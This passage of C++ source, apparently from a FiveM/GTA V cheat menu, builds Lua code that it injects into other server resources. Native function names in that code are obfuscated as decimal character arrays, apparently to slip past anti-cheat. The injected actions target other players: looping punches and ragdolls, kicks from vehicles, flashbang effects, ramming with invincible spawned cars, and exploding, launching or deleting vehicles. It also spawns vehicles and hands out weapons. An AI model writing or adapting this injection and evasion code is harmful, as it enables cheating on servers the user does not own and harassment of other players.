                            _g({65,112,112,108,121,68,97,109,97,103,101,84,111,80,101,100})(targetPed, 25, true, 2)

                            -- Force target to ragdoll instantly (Animasi mental jatuh)
                            -- Native: SET_PED_TO_RAGDOLL(Ped ped, int time1, int time2, int ragdollType, bool p4, bool p5, bool p6)
                            _g({83,101,116,80,101,100,84,111,82,97,103,100,111,108,108})(targetPed, 1500, 1500, 0, true, true, false)

                            -- Apply strong push velocity so they physically fly backwards
                            _g({65,112,112,108,121,70,111,114,99,101,84,111,69,110,116,105,116,121})(targetPed, 1, 0.0, 7.5, 4.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        end
                    end
                )lua";
            }
            else if (actionName == "Punch Player (Loop)") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local enabled = )lua" + (state ? "true" : "false") + R"lua(
                    if enabled then
                        if not _G.SouthAttackLoop then _G.SouthAttackLoop = {} end
                        _G.SouthAttackLoop[targetSid] = true
                        Citizen.CreateThread(function()
                            while _G.SouthAttackLoop[targetSid] do
                                local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                                if targetPlayer and targetPlayer ~= -1 then
                                    local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                                    if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                        -- Request control of the target entity
                                        _g({78,101,116,119,111,114,107,82,101,113,117,101,115,116,67,111,110,116,114,111,108,79,102,69,110,116,105,116,121})(targetPed)

                                        -- Apply punch damage
                                        _g({65,112,112,108,121,68,97,109,97,103,101,84,111,80,101,100})(targetPed, 15, true, 2)

                                        -- Force target to ragdoll (animasi mental)
                                        _g({83,101,116,80,101,100,84,111,82,97,103,100,111,108,108})(targetPed, 1000, 1000, 0, true, true, false)

                                        -- Push velocity (bouncing them around)
                                        _g({65,112,112,108,121,70,111,114,99,101,84,111,69,110,116,105,116,121})(targetPed, 1, 0.0, 5.0, 3.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                    end
                                end
                                Citizen.Wait(300) -- Increased wait to let the ragdoll animation play properly
                            end
                        end)
                    else
                        if _G.SouthAttackLoop then _G.SouthAttackLoop[targetSid] = false end
                    end
                )lua";
            }
            else if (actionName == "Kick From Vehicle (Loop)") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local enabled = )lua" + (state ? "true" : "false") + R"lua(
                    if enabled then
                        if not _G.SouthKickLoop then _G.SouthKickLoop = {} end
                        _G.SouthKickLoop[targetSid] = true
                        Citizen.CreateThread(function()
                            while _G.SouthKickLoop[targetSid] do
                                local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                                if targetPlayer and targetPlayer ~= -1 then
                                    local _citizen = _G[_d({67,105,116,105,122,101,110})]
                                    _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                                        if targetPed and targetPed ~= 0 then
                                            local vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(targetPed, false)
                                            if vehicle ~= 0 then
                                                _citizen[_d({87,97,105,116})](100)
                                                _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, _g({80,108,97,121,101,114,80,101,100,73,100})(), 1)
                                                _g({83,101,116,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(_g({80,108,97,121,101,114,80,101,100,73,100})(), vehicle, -1)
                                                _citizen[_d({87,97,105,116})](100)
                                                _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, 0, 0)
                                            end
                                        end
                                    end)
                                end
                                Citizen.Wait(2000)
                            end
                        end)
                    else
                        if _G.SouthKickLoop then _G.SouthKickLoop[targetSid] = false end
                    end
                )lua";
            }
            else if (actionName == "Flash Bang") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then _hook("CreateThread", function(o, ...) return o(...) end) end

                    if not _G.SouthFlashbangPlayers then _G.SouthFlashbangPlayers = {} end
                    _G.SouthFlashbangPlayers[targetSid] = true

                    local _citizen = _G[_d({67,105,116,105,122,101,110})]
                    _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                        while _G.SouthFlashbangPlayers[targetSid] do
                            local clientId = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                            if clientId ~= -1 then
                                local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId)
                                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                    local df = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                    _g({82,101,113,117,101,115,116,78,97,109,101,100,80,116,102,120,65,115,115,101,116})("scr_sr_tr")
                                    local t = 0
                                    while not _g({72,97,115,78,97,109,101,100,80,116,102,120,65,115,115,101,116,76,111,97,100,101,100})("scr_sr_tr") and t < 100 do
                                        _citizen[_d({87,97,105,116})](10)
                                        t = t + 1
                                    end
                                    if _g({72,97,115,78,97,109,101,100,80,116,102,120,65,115,115,101,116,76,111,97,100,101,100})("scr_sr_tr") then
                                        _g({85,115,101,80,97,114,116,105,99,108,101,70,120,65,115,115,101,116,78,101,120,116,67,97,108,108})("scr_sr_tr")
                                        _g({83,101,116,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,67,111,108,111,117,114})(1.0, 1.0, 1.0)
                                        _g({83,101,116,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,65,108,112,104,97})(1.0)
                                        _g({83,116,97,114,116,78,101,116,119,111,114,107,101,100,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,65,116,67,111,111,114,100})(
                                            "scr_sr_tr_car_change",
                                            df.x, df.y, df.z,
                                            0.0, 0.0, 0.0,
                                            2.0,
                                            false, false, false
                                        )
                                    end
                                end
                            else
                                _G.SouthFlashbangPlayers[targetSid] = nil
                            end
                            _citizen[_d({87,97,105,116})](200)
                        end
                    end)
                )lua";
            }
            else if (actionName == "Ram With Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then _hook("CreateThread", function(o, ...) return o(...) end) end

                    local player = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if player ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(player)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local tCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                            local forward = _g({71,101,116,69,110,116,105,116,121,70,111,114,119,97,114,100,86,101,99,116,105,118,101})(targetPed)

                            local spawnDist = 25.0
                            local spawnX = tCoords.x + (forward.x * spawnDist)
                            local spawnY = tCoords.y + (forward.y * spawnDist)
                            local spawnZ = tCoords.z

                            local dx = tCoords.x - spawnX
                            local dy = tCoords.y - spawnY

                            local targetHeading = math.deg(math.atan(dy, dx)) - 90.0
                            local magnitude = math.sqrt(dx * dx + dy * dy)
                            local speed = 100.0
                            local forceX = (dx / magnitude) * speed
                            local forceY = (dy / magnitude) * speed
                            local forceZ = -0.2

                            local modelHash = _g({71,101,116,72,97,115,104,75,101,121})('sultan')
                            _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                _g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
                                local t = 0
                                while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and t < 100 do Citizen.Wait(10) t=t+1 end

                                if _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then
                                    local vehicle = _g({67,114,101,97,116,101,86,101,104,105,99,108,101})(modelHash, spawnX, spawnY, spawnZ, targetHeading, true, true)
                                    if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(vehicle) then
                                        local netId = _g({78,101,116,119,111,114,107,71,101,116,78,101,116,119,111,114,107,73,100,70,114,111,109,69,110,116,105,116,121})(vehicle)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                                        _g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,101,116,69,110,116,105,116,121})(vehicle, true, true)
                                        _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(vehicle, true)
                                        _g({83,101,116,86,101,104,105,99,108,101,68,97,109,97,103,101,77,111,100,105,102,105,101,114})(vehicle, 0.0)
                                        _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,67,97,110,68,101,103,114,97,100,101})(vehicle, false)
                                        _g({83,101,116,86,101,104,105,99,108,101,84,121,114,101,115,67,97,110,66,117,114,115,116})(vehicle, false)
                                        _g({83,101,116,86,101,104,105,99,108,101,67,97,110,66,114,101,97,107})(vehicle, false)
                                        _g({83,101,116,86,101,104,105,99,108,101,67,97,110,66,101,86,105,115,105,98,108,121,68,97,109,97,103,101,100})(vehicle, false)
                                        _g({83,101,116,86,101,104,105,99,108,101,69,120,112,108,111,100,101,115,79,110,72,105,103,104,69,120,112,108,111,115,105,111,110,68,97,109,97,103,101})(vehicle, false)

                                        _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,79,110})(vehicle, true, true, false)
                                        _g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})(vehicle, speed)
                                        _g({83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121})(vehicle, forceX, forceY, forceZ)
                                        _g({83,101,116,86,101,104,105,99,108,101,71,114,97,118,105,116,121})(vehicle, true)
                                        _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,80,111,119,101,114,77,117,108,116,105,112,108,105,101,114})(vehicle, 300.0)

                                        _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                                    end
                                end
                            end)
                        end
                    end
                )lua";
            }

            if (code.empty()) {
                // Fallback: inject a harmless print so unmapped actions still execute without crashing
                code = "print([[LuaCore: no exploit handler for: " + actionName + "]])";
            }
            std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
        } catch (...) {}
    }

    static void ExecuteVehicleAction(const std::string& actionName, float x, float y, float z) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            std::string code;
            if (actionName == "Teleport to Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then _hook("CreateThread", function(o, ...) return o(...) end) end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                        local targetCoords = vector3(tx, ty, tz)
                        local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                        local minDist = 5.0
                        for _, v in ipairs(vehicles) do
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                            local dist = #(coords - targetCoords)
                            if dist < minDist then
                                minDist = dist
                                vehicle = v
                            end
                        end
                    end

                    if vehicle == 0 then
                        vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                    end

                    if vehicle and vehicle ~= 0 then
                        local vehCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(vehicle)
                        local wasVisible = _g({73,115,69,110,116,105,116,121,86,105,115,105,98,108,101})(ped)

                        _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(ped, false, false)
                        _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(ped, true)
                        _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(ped, false, false)
                        _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(ped, true)
                        _g({87,97,105,116})(0)

                        if _g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})(ped, false) then
                            local currentVeh = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                            if currentVeh and currentVeh ~= 0 then
                                _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(currentVeh, vehCoords.x, vehCoords.y, vehCoords.z + 1.0, true, true, true)
                            else
                                _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(ped, vehCoords.x, vehCoords.y, vehCoords.z + 1.0, true, true, true)
                            end
                        else
                            _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(ped, vehCoords.x, vehCoords.y, vehCoords.z + 1.0, true, true, true)
                        end

                        _g({87,97,105,116})(50)
                        _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(ped, false)
                        _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(ped, true, true)
                        _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(ped, false)
                        _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(ped, wasVisible, false)
                    end
                )lua";
            }
            else if (actionName == "Fix Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})

                    if ped and ped ~= 0 and exists_fn(ped) then
                        if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                            local targetCoords = vector3(tx, ty, tz)
                            local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                            if type(vehicles) == "table" then
                                local minDist = 5.0
                                for _, v in ipairs(vehicles) do
                                    if exists_fn(v) then
                                        local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                                        local dist = #(coords - targetCoords)
                                        if dist < minDist then
                                            minDist = dist
                                            vehicle = v
                                        end
                                    end
                                end
                            end
                        end

                        if vehicle == 0 then
                            vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                        end

                        if vehicle and vehicle ~= 0 and exists_fn(vehicle) then
                            _g({83,101,116,86,101,104,105,99,108,101,70,105,120,101,100})(vehicle)
                            _g({83,101,116,86,101,104,105,99,108,101,68,101,102,111,114,109,97,116,105,111,110,70,105,120,101,100})(vehicle)
                            _g({83,101,116,86,101,104,105,99,108,101,85,110,100,114,105,118,97,98,108,101})(vehicle, false)
                            _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,79,110})(vehicle, true, true, true)
                            _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,72,101,97,108,116,104})(vehicle, 1000.0)
                            local bodyHealthFunc = _g({83,101,116,86,101,104,105,99,108,101,66,111,100,121,72,101,97,108,116,104})
                            if bodyHealthFunc then bodyHealthFunc(vehicle, 1000.0) end
                            _g({83,101,116,86,101,104,105,99,108,101,80,101,116,114,111,108,84,97,110,107,72,101,97,108,116,104})(vehicle, 1000.0)
                            _g({83,101,116,86,101,104,105,99,108,101,70,117,101,108,76,101,118,101,108})(vehicle, 100.0)
                        end
                    end
                )lua";
            }
            else if (actionName == "Explode Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local coords = vector3(tx, ty, tz)
                    if tx == 0 and ty == 0 and tz == 0 then
                        local vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                        if vehicle and vehicle ~= 0 then
                            coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(vehicle)
                        else
                            coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                        end
                    end
                    _g({65,100,100,69,120,112,108,111,115,105,111,110})(coords.x, coords.y, coords.z, 2, 100.0, true, false, 1.0)
                )lua";
            }
            else if (actionName == "Explode Vehicle Tires") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                        local targetCoords = vector3(tx, ty, tz)
                        local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                        local minDist = 5.0
                        for _, v in ipairs(vehicles) do
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                            local dist = #(coords - targetCoords)
                            if dist < minDist then
                                minDist = dist
                                vehicle = v
                            end
                        end
                    end

                    if vehicle == 0 then
                        vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                    end

                    if vehicle and vehicle ~= 0 then
                        for i = 0, 7 do
                            _g({83,101,116,86,101,104,105,99,108,101,84,121,114,101,66,117,114,115,116})(vehicle, i, true, 1000.0)
                        end
                    end
                )lua";
            }
            else if (actionName == "Launch Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                        local targetCoords = vector3(tx, ty, tz)
                        local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                        local minDist = 5.0
                        for _, v in ipairs(vehicles) do
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                            local dist = #(coords - targetCoords)
                            if dist < minDist then
                                minDist = dist
                                vehicle = v
                            end
                        end
                    end

                    if vehicle == 0 then
                        vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                    end

                    if vehicle and vehicle ~= 0 then
                        _g({65,112,112,108,121,70,111,114,99,101,84,111,69,110,116,105,116,121})(vehicle, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                    end
                )lua";
            }
            else if (actionName == "Copy Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                        local targetCoords = vector3(tx, ty, tz)
                        local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                        local minDist = 5.0
                        for _, v in ipairs(vehicles) do
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                            local dist = #(coords - targetCoords)
                            if dist < minDist then
                                minDist = dist
                                vehicle = v
                            end
                        end
                    end

                    if vehicle == 0 then
                        vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                    end

                    if vehicle and vehicle ~= 0 then
                        local model = _g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(vehicle)
                        _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                        while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do _g({87,97,105,116})(0) end
                        local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                        local heading = _g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
                        local newVeh = _g({67,114,101,97,116,101,86,101,104,105,99,108,101})(model, coords.x, coords.y, coords.z, heading, true, false)
                        if newVeh ~= 0 then
                            _g({83,101,116,86,101,104,105,99,108,101,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121})(newVeh)
                            _g({83,101,116,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(ped, newVeh, -1)
                        end
                        _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                    end
                )lua";
            }
            else if (actionName == "Destroy Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local tx, ty, tz = )lua" + std::to_string(x) + ", " + std::to_string(y) + ", " + std::to_string(z) + R"lua(
                    local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local vehicle = 0
                    if tx ~= 0 or ty ~= 0 or tz ~= 0 then
                        local targetCoords = vector3(tx, ty, tz)
                        local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})("CVehicle")
                        local minDist = 5.0
                        for _, v in ipairs(vehicles) do
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(v)
                            local dist = #(coords - targetCoords)
                            if dist < minDist then
                                minDist = dist
                                vehicle = v
                            end
                        end
                    end

                    if vehicle == 0 then
                        vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(ped, false)
                    end

                    if vehicle and vehicle ~= 0 then
                        _g({78,101,116,119,111,114,107,82,101,113,117,101,115,116,67,111,110,116,114,111,108,79,102,69,110,116,105,116,121})(vehicle)
                        _g({87,97,105,116})(100)
                        for i = 1, 5 do
                            _g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(vehicle, true, true)
                            _g({68,101,108,101,116,101,69,110,116,105,116,121})(vehicle)
                            _g({87,97,105,116})(50)
                        end
                    end
                )lua";
            }

            if (!code.empty()) {
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            }
        } catch (...) {}
    }

    static void SpawnVehicle(const std::string& modelName, bool warpInto = true) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string warpCode = warpInto ? R"lua(
                    _g({84,97,115,107,87,97,114,112,73,110,116,111,86,101,104,105,99,108,101})(ped, vehicle, -1, 16.0, 2, 0)
            )lua" : "";

            std::string code = R"lua(
                local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                local function SafeWrap(setFunc)
                    return function(...)
                        return setFunc(...)
                    end
                end
                local SafeCVehicle = SafeWrap(_g({67,114,101,97,116,101,86,101,104,105,99,108,101}))

                local modelName = [===[)lua" + modelName + R"lua(]===]
                local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local heading = _g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)

                _g({82,101,113,117,101,115,116,77,111,100,101,108})(modelName)
                while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelName) do _g({87,97,105,116})(0) end

                local vehicle = SafeCVehicle(modelName, coords.x, coords.y, coords.z, heading, true, false)
                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(vehicle) then
                    _g({83,101,116,86,101,104,105,99,108,101,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121})(vehicle)
)lua" + warpCode + R"lua(
                    _g({78,101,116,119,111,114,107,82,101,103,105,115,116,101,114,69,110,116,105,116,121,65,115,78,101,116,119,111,114,107,101,100})(vehicle)
                    local netId = _g({86,101,104,84,111,78,101,116})(vehicle)
                    _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                    _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                end
                _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelName)
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void GiveAllWeapons() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string code = R"lua(
                local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                local ped = _g({80,108,97,121,101,114,80,101,100,73,100})()
                local weapons = {
                    -- Melee
                    "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT",
                    "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET",
                    "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE",
                    -- Pistols
                    "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                    "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                    "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER",
                    "WEAPON_REVOLVER_MK2", "WEAPON_DOUBLEACTION", "WEAPON_RAYPISTOL", "WEAPON_CERAMICPISTOL",
                    "WEAPON_NAVYREVOLVER", "WEAPON_GADGETPISTOL", "WEAPON_SNSPISTOL_MK2",
                    -- SMGs
                    "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                    "WEAPON_COMBATPDW", "WEAPON_MACHINEPISTOL", "WEAPON_MINISMG", "WEAPON_RAYCARBINE",
                    -- Assault Rifles
                    "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE",
                    "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                    "WEAPON_SPECIALCARBINE_MK2", "WEAPON_BULLPUPRIFLE", "WEAPON_BULLPUPRIFLE_MK2",
